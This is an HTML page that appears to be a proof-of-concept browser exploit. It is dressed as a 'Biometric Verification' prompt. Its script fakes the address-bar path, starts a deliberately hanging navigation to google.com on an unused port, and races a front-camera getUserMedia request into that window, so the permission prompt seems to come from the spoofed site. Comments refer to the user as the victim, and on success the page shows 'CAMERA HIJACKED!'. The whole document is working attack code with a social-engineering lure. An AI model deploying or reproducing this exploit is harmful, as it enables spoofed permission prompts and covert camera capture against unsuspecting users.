<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Secure Identity Verification</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <style>
      body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
        background: #f5f5f7;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      .card {
        max-width: 400px;
        width: 90%;
        background: #fff;
        padding: 30px 24px;
        border-radius: 20px;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1);
        text-align: center;
      }
      h2 {
        margin: 0 0 10px 0;
        font-size: 22px;
        color: #1d1d1f;
      }
      p {
        font-size: 14px;
        color: #86868b;
        margin: 0 0 24px 0;
        line-height: 1.4;
      }
      .btn-verify {
        font-size: 16px;
        padding: 12px 24px;
        border-radius: 12px;
        border: none;
        background: #34c759;
        color: #fff;
        font-weight: 600;
        cursor: pointer;
        width: 100%;
      }
      #video-preview {
        display: none;
        width: 100%;
        height: 240px;
        background: #000;
        border-radius: 12px;
        margin-top: 15px;
        object-fit: cover;
      }
      .status {
        margin-top: 15px;
        font-size: 13px;
        color: #ff9500;
        font-weight: 500;
      }
    </style>
  </head>
  <body>

    <div class="card">
      <h2>Biometric Verification</h2>
      <p>Please tap the button below to initialize the camera verification via secure identity check.</p>
      
      <!-- Tombol Utama Pemicu Event -->
      <button id="btn-trigger" class="btn-verify" onclick="triggerExploit()">Verify Identity</button>
      
      <!-- Video Element untuk menangkap stream wajah korban -->
      <video id="video-preview" autoplay playsinline muted></video>
      
      <div id="status-log" class="status"></div>
    </div>

    <script>
      function triggerExploit() {
        const btn = document.getElementById("btn-trigger");
        const video = document.getElementById("video-preview");
        const log = document.getElementById("status-log");

        btn.style.display = "none";
        video.style.display = "block";
        log.textContent = "Initializing secure connection...";

        // 1. Manipulasi visual address bar path
        history.pushState({}, "", "/secure-auth/biometric");

        // 2. STRATEGI UTAMA: Navigasi Agresif Menggantung dipicu SECARA INSTAN
        // Mengarahkan ke domain target spoofing (misal: google.com) dengan port mati agar halaman menggantung (provisional stage)
        location.href = "https://google.com:9090";

        // 3. MENYELIPKAN PERMINTAAN KAMERA DI DALAM REMAINTING EVENT LOOP
        // Menggunakan microtask agar dieksekusi tepat pada siklus pemrosesan yang sama 
        // saat browser mulai memproses navigasi tetapi belum sempat menghancurkan context halaman asal.
        Promise.resolve().then(() => {
          setTimeout(() => {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
              navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, // Langsung panggil kamera depan
                audio: false 
              })
              .then((stream) => {
                log.style.color = "#34c759";
                log.textContent = "SUCCESS: CAMERA HIJACKED!";
                video.srcObject = stream;
              })
              .catch((err) => {
                log.style.color = "#ff3b30";
                log.textContent = "Log: " + err.name;
              });
            }
          }, 0); // Jeda 0ms di dalam microtask untuk memaksa benturan timing (race condition)
        });
      }
    </script>
  </body>
</html>
